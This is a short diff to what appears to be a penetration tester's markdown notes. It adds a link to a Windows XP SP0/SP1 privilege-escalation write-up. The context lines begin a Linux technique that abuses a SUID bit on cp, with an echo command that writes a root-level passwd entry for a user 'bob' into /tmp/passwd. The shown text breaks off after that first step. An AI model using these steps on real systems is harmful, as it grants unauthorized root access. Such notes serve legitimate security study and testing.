@@ -1,6 +1,12 @@
 # Notes
 
 
+### Windows XP SP0/SP1 Privilege Escalation:
+```
+https://sohvaxus.github.io/content/winxp-sp1-privesc.html
+```
+
+
 ### SUID Flag on /usr/bin/cp command Privilege Escalation
 ```
 1. echo "bob:\$1\$-itnite\$VRvGqpGVibx/r9NPdLLTF1:0:0:root:/root:/bin/bash" >> /tmp/passwd
